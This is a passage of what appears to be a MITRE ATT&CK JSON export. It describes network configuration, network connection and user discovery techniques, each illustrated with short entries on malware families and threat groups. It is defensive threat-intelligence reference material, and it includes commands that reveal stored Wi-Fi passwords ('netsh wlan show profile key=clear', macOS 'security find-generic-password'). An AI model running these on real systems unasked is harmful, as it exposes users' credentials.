InternetQueryOptionA and its IP address by running nslookup myip.opendns.comresolver1.opendns.com\\r\\n."}, {"id": "S0587", "name": "Penquin", "description": "Penquin can report the IP of the compromised host to attacker controlled infrastructure."}, {"id": "S1145", "name": "Pikabot", "description": "Pikabot gathers victim network information through commands such as ipconfig and ipconfig /all."}, {"id": "S1031", "name": "PingPull", "description": "PingPull can retrieve the IP address of a compromised host."}, {"id": "S0501", "name": "PipeMon", "description": "PipeMon can collect and send the local IP address, RDP information, and the network adapter physical address as a part of its C2 beacon."}, {"id": "S0124", "name": "Pisloader", "description": "Pisloader has a command to collect the victim's IP address."}, {"id": "S0254", "name": "PLAINTEE", "description": "PLAINTEE uses the ipconfig /all command to gather the victim\u2019s IP address."}, {"id": "G1040", "name": "Play", "description": "Play has used the information-stealing tool Grixba to enumerate network information."}, {"id": "S0378", "name": "PoshC2", "description": "PoshC2 can enumerate network adapter information."}, {"id": "S0139", "name": "PowerDuke", "description": "PowerDuke has a command to get the victim's domain and NetBIOS name."}, {"id": "S0441", "name": "PowerShower", "description": "PowerShower has the ability to identify the current Windows domain of the infected host."}, {"id": "S0223", "name": "POWERSTATS", "description": "POWERSTATS can retrieve IP, network adapter configuration information, and domain from compromised hosts."}, {"id": "S0184", "name": "POWRUNER", "description": "POWRUNER may collect network configuration data by running ipconfig /all on a victim."}, {"id": "S0113", "name": "Prikormka", "description": "A module in Prikormka collects information from the victim about its IP addresses and MAC addresses."}, {"id": "S0238", "name": "Proxysvc", "description": "Proxysvc collects the network adapter information and domain/username information based on current remote sessions."}, {"id": "S0192", "name": "Pupy", "description": "Pupy has built in commands to identify a host\u2019s IP address and find out other network configuration settings by viewing connected sessions."}, {"id": "S0583", "name": "Pysa", "description": "Pysa can perform network reconnaissance using the Advanced IP Scanner tool."}, {"id": "S0650", "name": "QakBot", "description": "QakBot can use net config workstation, arp -a, nslookup, and ipconfig /all to gather network configuration information."}, {"id": "S0269", "name": "QUADAGENT", "description": "QUADAGENT gathers the current domain the victim system belongs to."}, {"id": "S0262", "name": "QuasarRAT", "description": "QuasarRAT has the ability to enumerate the Wide Area Network (WAN) IP through requests to ip-api[.]com, freegeoip[.]net, or api[.]ipify[.]org observed with user-agent string Mozilla/5.0 (Windows NT 6.3; rv:48.0) Gecko/20100101 Firefox/48.0."}, {"id": "S1076", "name": "QUIETCANARY", "description": "QUIETCANARY can identify the default proxy setting on a compromised host."}, {"id": "S0458", "name": "Ramsay", "description": "Ramsay can use ipconfig and Arp to collect network configuration information, including routing information and ARP tables."}, {"id": "S0241", "name": "RATANKBA", "description": "RATANKBA gathers the victim\u2019s IP address via the ipconfig -all command."}, {"id": "S0172", "name": "Reaver", "description": "Reaver collects the victim's IP address."}, {"id": "S0153", "name": "RedLeaves", "description": "RedLeaves can obtain information about network parameters."}, {"id": "S0125", "name": "Remsec", "description": "Remsec can obtain information about network configuration, including the routing table, ARP cache, and DNS cache."}, {"id": "S0379", "name": "Revenge RAT", "description": "Revenge RAT collects the IP address and MAC address from the system."}, {"id": "S0433", "name": "Rifdoor", "description": "Rifdoor has the ability to identify the IP address of the compromised host."}, {"id": "S0448", "name": "Rising Sun", "description": "Rising Sun can detect network adapter and IP address information."}, {"id": "S0270", "name": "RogueRobin", "description": "RogueRobin gathers the IP address and domain from the victim\u2019s machine."}, {"id": "S0103", "name": "route", "description": "route can be used to discover routing configuration information."}, {"id": "S1073", "name": "Royal", "description": "Royal can enumerate IP addresses using GetIpAddrTable."}, {"id": "S0446", "name": "Ryuk", "description": "Ryuk has called GetIpNetTable in attempt to identify all mounted drives and hosts that have Address Resolution Protocol (ARP) entries."}, {"id": "S0085", "name": "S-Type", "description": "S-Type has used ipconfig /all on a compromised host."}, {"id": "S1018", "name": "Saint Bot", "description": "Saint Bot can collect the IP address of a victim machine."}, {"id": "S1085", "name": "Sardonic", "description": "Sardonic has the ability to execute the ipconfig command."}, {"id": "S0461", "name": "SDBbot", "description": "SDBbot has the ability to determine the domain name and whether a proxy is configured on a compromised host."}, {"id": "S0596", "name": "ShadowPad", "description": "ShadowPad has collected the domain name of the victim system."}, {"id": "S0140", "name": "Shamoon", "description": "Shamoon obtains the target's IP address and local network segment."}, {"id": "S0450", "name": "SHARPSTATS", "description": "SHARPSTATS has the ability to identify the domain of the compromised host."}, {"id": "S0445", "name": "ShimRatReporter", "description": "ShimRatReporter gathered the local proxy, domain, IP, routing tables, mac address, gateway, DNS servers, and DHCP status information from an infected host."}, {"id": "S0589", "name": "Sibot", "description": "Sibot checked if the compromised system is configured to use proxies."}, {"id": "G1008", "name": "SideCopy", "description": "SideCopy has identified the IP address of a compromised host."}, {"id": "S0610", "name": "SideTwist", "description": "SideTwist has the ability to collect the domain name on a compromised host."}, {"id": "G0121", "name": "Sidewinder", "description": "Sidewinder has used malware to collect information on network interfaces, including the MAC address."}, {"id": "S0633", "name": "Sliver", "description": "Sliver has the ability to gather network configuration information."}, {"id": "S1035", "name": "Small Sieve", "description": "Small Sieve can obtain the IP address of a victim host."}, {"id": "S1124", "name": "SocGholish", "description": "SocGholish has the ability to enumerate the domain name of a victim, as well as if the host is a member of an Active Directory domain."}, {"id": "S0516", "name": "SoreFang", "description": "SoreFang can collect the TCP/IP, DNS, DHCP, and network adapter configuration on a compromised host via ipconfig.exe /all."}, {"id": "S0374", "name": "SpeakUp", "description": "SpeakUp uses the ifconfig -a command. "}, {"id": "S0646", "name": "SpicyOmelette", "description": "SpicyOmelette can identify the IP of a compromised system."}, {"id": "S1030", "name": "Squirrelwaffle", "description": "Squirrelwaffle has collected the victim\u2019s external IP address."}, {"id": "S1037", "name": "STARWHALE", "description": "STARWHALE has the ability to collect the IP address of an infected host."}, {"id": "G0038", "name": "Stealth Falcon", "description": "Stealth Falcon malware gathers the Address Resolution Protocol (ARP) table from the victim."}, {"id": "S0491", "name": "StrongPity", "description": "StrongPity can identify the IP address of a compromised host."}, {"id": "S0603", "name": "Stuxnet", "description": "Stuxnet collects the IP address of a compromised system."}, {"id": "S0559", "name": "SUNBURST", "description": "SUNBURST collected all network interface MAC addresses that are up and not loopback devices, as well as IP address, DHCP configuration, and domain information."}, {"id": "S0018", "name": "Sykipot", "description": "Sykipot may use ipconfig /all to gather system network configuration details."}, {"id": "S0060", "name": "Sys10", "description": "Sys10 collects the local IP address of the victim and sends it to the C2."}, {"id": "S0663", "name": "SysUpdate", "description": "SysUpdate can collected the IP address and domain name of a compromised host."}, {"id": "S0098", "name": "T9000", "description": "T9000 gathers and beacons the MAC and IP addresses during installation."}, {"id": "S0011", "name": "Taidoor", "description": "Taidoor has collected the MAC address of a compromised host; it can also use GetAdaptersInfo to identify network adapters."}, {"id": "S0467", "name": "TajMahal", "description": "TajMahal has the ability to identify the MAC address on an infected host."}, {"id": "G0139", "name": "TeamTNT", "description": "TeamTNT has enumerated the host machine\u2019s IP address."}, {"id": "G0027", "name": "Threat Group-3390", "description": "Threat Group-3390 actors use NBTscan to discover vulnerable systems."}, {"id": "S0678", "name": "Torisma", "description": "Torisma can collect the local MAC address using GetAdaptersInfo as well as the system's IP address."}, {"id": "S0266", "name": "TrickBot", "description": "TrickBot obtains the IP address, location, and other relevant network information from the victim\u2019s machine."}, {"id": "S0094", "name": "Trojan.Karagany", "description": "Trojan.Karagany can gather information on the network configuration of a compromised host."}, {"id": "G0081", "name": "Tropic Trooper", "description": "Tropic Trooper has used scripts to collect the host's network topology."}, {"id": "S0436", "name": "TSCookie", "description": "TSCookie has the ability to identify the IP of the infected host."}, {"id": "S0647", "name": "Turian", "description": "Turian can retrieve the internal IP address of a compromised host."}, {"id": "G0010", "name": "Turla", "description": "Turla surveys a system upon check-in to discover network configuration details using the arp -a, nbtstat -n, net config, ipconfig /all, and route commands, as well as NBTscan. Turla RPC backdoors have also retrieved registered RPC interface information from process memory."}, {"id": "S0130", "name": "Unknown Logger", "description": "Unknown Logger can obtain information about the victim's IP address."}, {"id": "S0275", "name": "UPPERCUT", "description": "UPPERCUT has the capability to gather the victim's proxy information."}, {"id": "S0452", "name": "USBferry", "description": "USBferry can detect the infected machine's network topology using ipconfig and arp."}, {"id": "S0476", "name": "Valak", "description": "Valak has the ability to identify the domain and the MAC and IP addresses of an infected machine."}, {"id": "S0257", "name": "VERMIN", "description": "VERMIN gathers the local IP address."}, {"id": "S0180", "name": "Volgmer", "description": "Volgmer can gather the IP address from the victim's machine."}, {"id": "G1017", "name": "Volt Typhoon", "description": "Volt Typhoon has executed multiple commands to enumerate network topology and settings including  ipconfig, netsh interface firewall show all, and netsh interface portproxy show all."}, {"id": "S0366", "name": "WannaCry", "description": "WannaCry will attempt to determine the local network segment it is a part of."}, {"id": "S0515", "name": "WellMail", "description": "WellMail can identify the IP address of the victim system."}, {"id": "S0514", "name": "WellMess", "description": "WellMess can identify the IP address and user domain on the target machine."}, {"id": "G0102", "name": "Wizard Spider", "description": "Wizard Spider has used ipconfig to identify the network configuration of a victim machine. Wizard Spider has also used the PowerShell cmdlet Get-ADComputer to collect IP address data from Active Directory."}, {"id": "S1065", "name": "Woody RAT", "description": "Woody RAT can retrieve network interface and proxy information."}, {"id": "S0341", "name": "Xbash", "description": "Xbash can collect IP addresses and local intranet information from a victim\u2019s machine."}, {"id": "S0653", "name": "xCaon", "description": "xCaon has used the GetAdaptersInfo() API call to get the victim's MAC address."}, {"id": "S0248", "name": "yty", "description": "yty runs ipconfig /all and collects the domain name."}, {"id": "S0251", "name": "Zebrocy", "description": "Zebrocy runs the ipconfig /all command."}, {"id": "S0230", "name": "ZeroT", "description": "ZeroT gathers the victim's IP address and domain information, and then sends it to its C2 server."}, {"id": "G0128", "name": "ZIRCONIUM", "description": "ZIRCONIUM has used a tool to enumerate proxy settings in the target environment."}, {"id": "S0350", "name": "zwShell", "description": "zwShell can obtain the victim IP address."}], "sub_techniques": [{"name": "Internet Connection Discovery", "description": "Adversaries may check for Internet connectivity on compromised systems. This may be performed during automated discovery and can be accomplished in numerous ways such as using Ping, tracert, and GET requests to websites.", "detailed_description": "Adversaries may check for Internet connectivity on compromised systems. This may be performed during automated discovery and can be accomplished in numerous ways such as using Ping, tracert, and GET requests to websites.\nAdversaries may use the results and responses from these requests to determine if the system is capable of communicating with their C2 servers before attempting to connect to them. The results may also be used to identify routes, redirectors, and proxy servers.", "id": "T1016.001", "examples": [{"id": "G0016", "name": "APT29", "description": "APT29 has ensured web servers in a victim environment are Internet accessible before copying tools or malware to it."}, {"id": "S1066", "name": "DarkTortilla", "description": "DarkTortilla can check for internet connectivity by issuing HTTP GET requests."}, {"id": "G1016", "name": "FIN13", "description": "FIN13 has used Ping and tracert for network reconnaissance efforts."}, {"id": "G0061", "name": "FIN8", "description": "FIN8 has used the Ping command to check connectivity to actor-controlled C2 servers."}, {"id": "G0047", "name": "Gamaredon Group", "description": "Gamaredon Group has tested connectivity between a compromised machine and a C2 server using  Ping with commands such as CSIDL_SYSTEM\\cmd.exe /c ping -n 1."}, {"id": "S0597", "name": "GoldFinder", "description": "GoldFinder performed HTTP GET requests to check internet connectivity and identify HTTP proxy servers and other redirectors that an HTTP request traveled through."}, {"id": "G0125", "name": "HAFNIUM", "description": "HAFNIUM has checked for network connectivity from a compromised host using ping, including attempts to contact google[.]com."}, {"id": "G1001", "name": "HEXANE", "description": "HEXANE has used tools including BITSAdmin to test internet connectivity from compromised hosts."}, {"id": "G0059", "name": "Magic Hound", "description": "Magic Hound has conducted a network call out to a specific website as part of their initial discovery activity."}, {"id": "S0284", "name": "More_eggs", "description": "More_eggs has used HTTP GET requests to check internet connectivity."}, {"id": "S0691", "name": "Neoichor", "description": "Neoichor can check for Internet connectivity by contacting bing[.]com with the request format bing[.]com?id=<GetTickCount>."}, {"id": "S1107", "name": "NKAbuse", "description": "NKAbuse utilizes external services such as ifconfig.me to identify the victim machine's IP address."}, {"id": "C0014", "name": "Operation Wocao", "description": "During Operation Wocao, threat actors used a Visual Basic script that checked for internet connectivity."}, {"id": "S0650", "name": "QakBot", "description": "QakBot can measure the download speed on a targeted host."}, {"id": "S0686", "name": "QuietSieve", "description": "QuietSieve can check C2 connectivity with a ping to 8.8.8.8 (Google public DNS)."}, {"id": "S0448", "name": "Rising Sun", "description": "Rising Sun can test a connection to a specified network IP address over a specified port number."}, {"id": "C0024", "name": "SolarWinds Compromise", "description": "During the SolarWinds Compromise, APT29 used GoldFinder to perform HTTP GET requests to check internet connectivity and identify HTTP proxy servers and other redirectors that an HTTP request travels through."}, {"id": "S1049", "name": "SUGARUSH", "description": "SUGARUSH has checked for internet connectivity from an infected host before attempting to establish a new TCP connection."}, {"id": "S0663", "name": "SysUpdate", "description": "SysUpdate can contact the DNS server operated by Google as part of its C2 establishment process."}, {"id": "G1018", "name": "TA2541", "description": "TA2541 has run scripts to check internet connectivity from compromised hosts. "}, {"id": "G0010", "name": "Turla", "description": "Turla has used tracert to check internet connectivity."}, {"id": "G1017", "name": "Volt Typhoon", "description": "Volt Typhoon has employed Ping to check network connectivity."}, {"id": "S1065", "name": "Woody RAT", "description": "Woody RAT can make Ping GET HTTP requests to its C2 server at regular intervals for network connectivity checks."}]}, {"name": "Wi-Fi Discovery", "description": "Adversaries may search for information about Wi-Fi networks, such as network names and passwords, on compromised systems. Adversaries may use Wi-Fi information as part of Account Discovery, Remote System Discovery, and other discovery or Credential Access activity to support both ongoing and future campaigns.", "detailed_description": "Adversaries may search for information about Wi-Fi networks, such as network names and passwords, on compromised systems. Adversaries may use Wi-Fi information as part of Account Discovery, Remote System Discovery, and other discovery or Credential Access activity to support both ongoing and future campaigns.\nAdversaries may collect various types of information about Wi-Fi networks from hosts. For example, on Windows names and passwords of all Wi-Fi networks a device has previously connected to may be available through netsh wlan show profiles to enumerate Wi-Fi names and then netsh wlan show profile \"Wi-Fi name\" key=clear to show a Wi-Fi network\u2019s corresponding password. Additionally, names and other details of locally reachable Wi-Fi networks can be discovered using calls to wlanAPI.dll Native API functions.\nOn Linux, names and passwords of all Wi-Fi-networks a device has previously connected to may be available in files under /etc/NetworkManager/system-connections/. On macOS, the password of a known Wi-Fi may be identified with security find-generic-password -wa wifiname (requires admin username/password).", "id": "T1016.002", "examples": [{"id": "S0331", "name": "Agent Tesla", "description": "Agent Tesla can collect names and passwords of all Wi-Fi networks to which a device has previously connected."}, {"id": "S0367", "name": "Emotet", "description": "Emotet can extract names of all locally reachable Wi-Fi networks and then perform a brute-force attack to spread to new networks."}, {"id": "G0059", "name": "Magic Hound", "description": "Magic Hound has collected names and passwords of all Wi-Fi networks to which a device has previously connected."}]}]}, {"name": "System Network Connections Discovery", "description": "Adversaries may attempt to get a listing of network connections to or from the compromised system they are currently accessing or from remote systems by querying for information over the network.", "detailed_description": "Adversaries may attempt to get a listing of network connections to or from the compromised system they are currently accessing or from remote systems by querying for information over the network.\nAn adversary who gains access to a system that is part of a cloud-based environment may map out Virtual Private Clouds or Virtual Networks in order to determine what systems and services are connected. The actions performed are likely the same types of discovery techniques depending on the operating system, but the resulting information may include details about the networked cloud environment relevant to the adversary's goals. Cloud providers may have different ways in which their virtual networks operate. Similarly, adversaries who gain access to network devices may also perform similar discovery activities to gather information about connected systems and services.\nUtilities and commands that acquire this information include netstat, \"net use,\" and \"net session\" with Net. In Mac and Linux, netstat and lsof can be used to list current connections. who -a and w can be used to show which users are currently logged in, similar to \"net session\". Additionally, built-in features native to network devices and Network Device CLI may be used (e.g. show ip sockets, show tcp brief).", "id": "T1049", "examples": [{"id": "G0018", "name": "admin@338", "description": "admin@338 actors used the following command following exploitation of a machine with LOWBALL malware to display network connections: netstat -ano >> %temp%\\download"}, {"id": "G0138", "name": "Andariel", "description": "Andariel has used the netstat -naop tcp command to display TCP connections on a victim's machine."}, {"id": "G0006", "name": "APT1", "description": "APT1 used the net use command to get a listing on network connections."}, {"id": "G0022", "name": "APT3", "description": "APT3 has a tool that can enumerate current network connections."}, {"id": "G0050", "name": "APT32", "description": "APT32 used the netstat -anpo tcp command to display TCP connections on the victim's machine."}, {"id": "G0082", "name": "APT38", "description": "APT38 installed a port monitoring tool, MAPMAKER, to print the active TCP connections on the local system."}, {"id": "G0096", "name": "APT41", "description": "APT41 has enumerated IP addresses of network resources and used the netstat command as part of network reconnaissance. The group has also used a malware variant, HIGHNOON, to enumerate active RDP sessions."}, {"id": "G1023", "name": "APT5", "description": "APT5 has used the BLOODMINE utility to collect data on web requests from Pulse Secure Connect logs."}, {"id": "S0456", "name": "Aria-body", "description": "Aria-body has the ability to gather TCP and UDP table status listings."}, {"id": "S0638", "name": "Babuk", "description": "Babuk can use \"WNetOpenEnumW\" and \"WNetEnumResourceW\" to enumerate files in network resources for encryption."}, {"id": "G0135", "name": "BackdoorDiplomacy", "description": "BackdoorDiplomacy has used NetCat and PortQry  to enumerate network connections and display the status of related TCP and UDP ports."}, {"id": "S1081", "name": "BADHATCH", "description": "BADHATCH can execute netstat.exe -f on a compromised machine."}, {"id": "S0089", "name": "BlackEnergy", "description": "BlackEnergy has gathered information about local network connections using netstat."}, {"id": "S0335", "name": "Carbon", "description": "Carbon uses the netstat -r and netstat -an commands."}, {"id": "S0674", "name": "CharmPower", "description": "CharmPower can use netsh wlan show profiles to list specific Wi-Fi profile details."}, {"id": "G0114", "name": "Chimera", "description": "Chimera has used netstat -ano | findstr EST to discover network connections."}, {"id": "S0154", "name": "Cobalt Strike", "description": "Cobalt Strike can produce a sessions report from compromised hosts."}, {"id": "S0244", "name": "Comnie", "description": "Comnie executes the netstat -ano command."}, {"id": "S0575", "name": "Conti", "description": "Conti can enumerate routine network connections from a compromised host."}, {"id": "S0488", "name": "CrackMapExec", "description": "CrackMapExec can discover active sessions for a targeted system."}, {"id": "S0625", "name": "Cuba", "description": "Cuba can use the function GetIpNetTable to recover the last connections to the victim's machine."}, {"id": "S0567", "name": "Dtrack", "description": "Dtrack can collect network and active connection information."}, {"id": "S0038", "name": "Duqu", "description": "The discovery modules used with Duqu can collect information on network connections."}, {"id": "G1006", "name": "Earth Lusca", "description": "Earth Lusca employed a PowerShell script called RDPConnectionParser to read and filter the Windows event log \"Microsoft-Windows-TerminalServices-RDPClient/Operational\"(Event ID 1024) to obtain network information from RDP connections. Earth Lusca has also used netstat from a compromised system to obtain network connection information."}, {"id": "S0554", "name": "Egregor", "description": "Egregor can enumerate all connected drives."}, {"id": "S0363", "name": "Empire", "description": "Empire can enumerate the current network connections of a host."}, {"id": "S0091", "name": "Epic", "description": "Epic uses the net use, net session, and netstat commands to gather information on network connections."}, {"id": "G1016", "name": "FIN13", "description": "FIN13 has used netstat and other net  commands for network reconnaissance efforts."}, {"id": "S0696", "name": "Flagpro", "description": "Flagpro has been used to execute netstat -ano on a compromised host."}, {"id": "S1144", "name": "FRP", "description": "FRP can use a dashboard and U/I to display the status of connections from the FRP client and server."}, {"id": "C0007", "name": "FunnyDream", "description": "During FunnyDream, the threat actors used netstat to discover network connections on remote systems."}, {"id": "G0093", "name": "GALLIUM", "description": "GALLIUM used netstat -oan to obtain information about the victim network connections."}, {"id": "S0237", "name": "GravityRAT", "description": "GravityRAT uses the netstat command to find open ports on the victim\u2019s machine."}, {"id": "G1001", "name": "HEXANE", "description": "HEXANE has used netstat to monitor connections to specific ports."}, {"id": "G1032", "name": "INC Ransom", "description": "INC Ransom has used RDP to test network connections."}, {"id": "S0283", "name": "jRAT", "description": "jRAT can list network connections."}, {"id": "G0004", "name": "Ke3chang", "description": "Ke3chang performs local network connection discovery using netstat."}, {"id": "S0356", "name": "KONNI", "description": "KONNI has used net session on the victim's machine."}, {"id": "S1075", "name": "KOPILUWAK", "description": "KOPILUWAK can use netstat, Arp, and Net to discover current TCP connections."}, {"id": "S0236", "name": "Kwampirs", "description": "Kwampirs collects a list of active and listening connections by using the command netstat -nao as well as a list of available network mappings with net use."}, {"id": "G0032", "name": "Lazarus Group", "description": "Lazarus Group has used net use to identify and establish a network connection with a remote host."}, {"id": "S0681", "name": "Lizar", "description": "Lizar has a plugin to retrieve information about all active network sessions on the infected server."}, {"id": "S0532", "name": "Lucifer", "description": "Lucifer can identify the IP and port numbers for all remote connections from the compromised host."}, {"id": "S1141", "name": "LunarWeb", "description": "LunarWeb can enumerate system network connections."}, {"id": "S0409", "name": "Machete", "description": "Machete uses the netsh wlan show networks mode=bssid and netsh wlan show interfaces commands to list all nearby WiFi networks and connected interfaces."}, {"id": "S1060", "name": "Mafalda", "description": "Mafalda can use the GetExtendedTcpTable function to retrieve information about established TCP connections."}, {"id": "G0059", "name": "Magic Hound", "description": "Magic Hound has used quser.exe to identify existing RDP connections."}, {"id": "S0449", "name": "Maze", "description": "Maze has used the \"WNetOpenEnumW\", \"WNetEnumResourceW\", \"WNetCloseEnum\" and \"WNetAddConnection2W\" functions to enumerate the network resources on the infected machine."}, {"id": "G0045", "name": "menuPass", "description": "menuPass has used net use to conduct connectivity checks to machines."}, {"id": "S0443", "name": "MESSAGETAP", "description": "After loading the keyword and phone data files, MESSAGETAP begins monitoring all network connections to and from the victim server. "}, {"id": "G0069", "name": "MuddyWater", "description": "MuddyWater has used a PowerShell backdoor to check for Skype connections on the target machine."}, {"id": "G0129", "name": "Mustang Panda", "description": "Mustang Panda has used netstat -ano to determine network connection information."}, {"id": "S0102", "name": "nbtstat", "description": "nbtstat can be used to discover current NetBIOS sessions."}, {"id": "S0039", "name": "Net", "description": "Commands such as net use and net session can be used in Net to gather information about network connections from a particular host."}, {"id": "S0104", "name": "netstat", "description": "netstat can be used to enumerate local network connections, including active TCP connections and other network statistics."}, {"id": "S0198", "name": "NETWIRE", "description": "NETWIRE can capture session logon details from a compromised host."}, {"id": "G0049", "name": "OilRig", "description": "OilRig has used netstat -an on a victim to get a listing of network connections."}, {"id": "S0439", "name": "Okrum", "description": "Okrum was seen using NetSess to discover NetBIOS sessions."}, {"id": "C0012", "name": "Operation CuckooBees", "description": "During Operation CuckooBees, the threat actors used the net session, net use, and netstat commands as part of their advanced reconnaissance."}, {"id": "C0014", "name": "Operation Wocao", "description": "During Operation Wocao, threat actors collected a list of open connections on the infected system using netstat and checks whether it has an internet connection."}, {"id": "S0165", "name": "OSInfo", "description": "OSInfo enumerates the current network connections similar to  net use ."}, {"id": "S1091", "name": "Pacu", "description": "Once inside a Virtual Private Cloud, Pacu can attempt to identify DirectConnect, VPN, or VPC Peering."}, {"id": "S0013", "name": "PlugX", "description": "PlugX has a module for enumerating TCP and UDP network connections and associated processes using the netstat command."}, {"id": "G0033", "name": "Poseidon Group", "description": "Poseidon Group obtains and saves information about victim network interfaces and addresses."}, {"id": "S0378", "name": "PoshC2", "description": "PoshC2 contains an implementation of netstat to enumerate TCP and UDP connections."}, {"id": "S0184", "name": "POWRUNER", "description": "POWRUNER may collect active network connections by running netstat -an on a victim."}, {"id": "S0192", "name": "Pupy", "description": "Pupy has a built-in utility command for netstat, can do net session through PowerView, and has an interactive shell which can be used to discover additional information."}, {"id": "S1032", "name": "PyDCrypt", "description": "PyDCrypt has used netsh to find RPC connections on remote machines."}, {"id": "S0650", "name": "QakBot", "description": "QakBot can use netstat to enumerate current network connections."}, {"id": "S0458", "name": "Ramsay", "description": "Ramsay can use netstat to enumerate network connections."}, {"id": "S0241", "name": "RATANKBA", "description": "RATANKBA uses netstat -ano to search for specific IP address ranges."}, {"id": "S0153", "name": "RedLeaves", "description": "RedLeaves can enumerate drives and Remote Desktop sessions."}, {"id": "S0125", "name": "Remsec", "description": "Remsec can obtain a list of active connections and open ports."}, {"id": "G0034", "name": "Sandworm Team", "description": "Sandworm Team had gathered user, IP address, and server data related to RDP sessions on a compromised host. It has also accessed network diagram files useful for understanding how a host's network was configured."}, {"id": "S1085", "name": "Sardonic", "description": "Sardonic has the ability to execute the netstat command."}, {"id": "S0445", "name": "ShimRatReporter", "description": "ShimRatReporter used the Windows function GetExtendedUdpTable to detect connected UDP endpoints."}, {"id": "S0063", "name": "SHOTPUT", "description": "SHOTPUT uses netstat to list TCP connection status."}, {"id": "S0589", "name": "Sibot", "description": "Sibot has retrieved a GUID associated with a present LAN connection on a compromised machine."}, {"id": "S0633", "name": "Sliver", "description": "Sliver can collect network connection information."}, {"id": "S0533", "name": "SLOTHFULMEDIA", "description": "SLOTHFULMEDIA can enumerate open ports on a victim machine."}, {"id": "S0374", "name": "SpeakUp", "description": "SpeakUp uses the arp -a command. "}, {"id": "S0018", "name": "Sykipot", "description": "Sykipot may use netstat -ano to display active network connections."}, {"id": "G0139", "name": "TeamTNT", "description": "TeamTNT has run netstat -anp to search for rival malware connections. TeamTNT has also used libprocesshider to modify /etc/ld.so.preload."}, {"id": "G0027", "name": "Threat Group-3390", "description": "Threat Group-3390 has used net use and netstat to conduct internal discovery of systems. The group has also used quser.exe to identify existing RDP sessions on a victim."}, {"id": "G1022", "name": "ToddyCat", "description": "ToddyCat has used netstat -anop tcp to discover TCP connections to compromised hosts."}, {"id": "S0678", "name": "Torisma", "description": "Torisma can use WTSEnumerateSessionsW to monitor remote desktop connections."}, {"id": "S0094", "name": "Trojan.Karagany", "description": "Trojan.Karagany can use netstat to collect a list of network connections."}, {"id": "G0081", "name": "Tropic Trooper", "description": "Tropic Trooper has tested if the localhost network is available and other connection capability on an infected system using command scripts."}, {"id": "G0010", "name": "Turla", "description": "Turla surveys a system upon check-in to discover active local network connections using the netstat -an, net use, net file, and net session commands. Turla RPC backdoors have also enumerated the IPv4 TCP connection table via the GetTcpTable2 API call."}, {"id": "S0452", "name": "USBferry", "description": "USBferry can use netstat and nbtstat to detect active network connections."}, {"id": "S0180", "name": "Volgmer", "description": "Volgmer can gather information about TCP connection state."}, {"id": "G1017", "name": "Volt Typhoon", "description": "Volt Typhoon has used netstat -ano on compromised hosts to enumerate network connections."}, {"id": "S0579", "name": "Waterbear", "description": "Waterbear can use API hooks on GetExtendedTcpTable to retrieve a table containing a list of TCP endpoints available to the application."}, {"id": "S0251", "name": "Zebrocy", "description": "Zebrocy uses netstat -aon to gather network connection information."}], "sub_techniques": []}, {"name": "System Owner/User Discovery", "description": "Adversaries may attempt to identify the primary user, currently logged in user, set of users that commonly uses a system, or whether a user is actively using the system. They may do this, for example, by retrieving account usernames or by using OS Credential Dumping. The information may be collected in a number of different ways using other Discovery techniques, because user and username details are prevalent throughout a system and include running process ownership, file/directory ownership, session information, and system logs. Adversaries may use the information from System Owner/User Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.", "detailed_description": "Adversaries may attempt to identify the primary user, currently logged in user, set of users that commonly uses a system, or whether a user is actively using the system. They may do this, for example, by retrieving account usernames or by using OS Credential Dumping. The information may be collected in a number of different ways using other Discovery techniques, because user and username details are prevalent throughout a system and include running process ownership, file/directory ownership, session information, and system logs. Adversaries may use the information from System Owner/User Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\nVarious utilities and commands may acquire this information, including whoami. In macOS and Linux, the currently logged in user can be identified with w and who. On macOS the dscl . list /Users | grep -v '_' command can also be used to enumerate user accounts. Environment variables, such as %USERNAME% and $USER, may also be used to access this information.\nOn network devices, Network Device CLI commands such as show users and show ssh can be used to display users currently logged into the device.", "id": "T1033", "examples": [{"id": "S1028", "name": "Action RAT", "description": "Action RAT has the ability to collect the username from an infected host."}, {"id": "S0331", "name": "Agent Tesla", "description": "Agent Tesla can collect the username from the victim\u2019s machine."}, {"id": "S0092", "name": "Agent.btz", "description": "Agent.btz obtains the victim username and saves it to a file."}, {"id": "S1025", "name": "Amadey", "description": "Amadey has collected the user name from a compromised host using GetUserNameA."}, {"id": "G0073", "name": "APT19", "description": "APT19 used an HTTP malware variant and a Port 22 malware variant to collect the victim\u2019s username."}, {"id": "G0022", "name": "APT3", "description": "An APT3 downloader uses the Windows command \"cmd.exe\" /C whoami to verify that it is running with the elevated privileges of \"System.\""}, {"id": "G0050", "name": "APT32", "description": "APT32 collected the victim's username and executed the whoami command on the victim's machine. APT32 executed shellcode to collect the username on the victim's machine. "}, {"id": "G0067", "name": "APT37", "description": "APT37 identifies the victim username."}, {"id": "G0082", "name": "APT38", "description": "APT38 has identified primary users, currently logged in users, sets of users that commonly use a system, or inactive users."}, {"id": "G0087", "name": "APT39", "description": "APT39 used Remexi to collect usernames from the system."}, {"id": "G0096", "name": "APT41", "description": "APT41 has executed whoami commands, including using the WMIEXEC utility to execute this on remote machines."}, {"id": "G0143", "name": "Aquatic Panda", "description": "Aquatic Panda gathers information on recently logged-in users on victim devices."}, {"id": "S0456", "name": "Aria-body", "description": "Aria-body has the ability to identify the username on a compromised host."}, {"id": "S1087", "name": "AsyncRAT", "description": "AsyncRAT can check if the current user of a compromised system is an administrator. "}, {"id": "S1029", "name": "AuTo Stealer", "description": "AuTo Stealer has the ability to collect the username from an infected host."}, {"id": "S0344", "name": "Azorult", "description": "Azorult can collect the username from the victim\u2019s machine."}, {"id": "S0414", "name": "BabyShark", "description": "BabyShark has executed the whoami command."}, {"id": "S0093", "name": "Backdoor.Oldrea", "description": "Backdoor.Oldrea collects the current username from the victim."}, {"id": "S1081", "name": "BADHATCH", "description": "BADHATCH can obtain logged user information from a compromised machine and can execute the command whoami.exe."}, {"id": "S0534", "name": "Bazar", "description": "Bazar can identify the username of the infected user."}, {"id": "S0017", "name": "BISCUIT", "description": "BISCUIT has a command to gather the username from the system."}, {"id": "S1068", "name": "BlackCat", "description": "BlackCat can utilize net use commands to discover the user name on a compromised host."}, {"id": "S0521", "name": "BloodHound", "description": "BloodHound can collect information on user sessions."}, {"id": "S0657", "name": "BLUELIGHT", "description": "BLUELIGHT can collect the username on a compromised host."}, {"id": "S0486", "name": "Bonadan", "description": "Bonadan has discovered the username of the user running the backdoor."}, {"id": "S0635", "name": "BoomBox", "description": "BoomBox can enumerate the username on a compromised host."}, {"id": "S1039", "name": 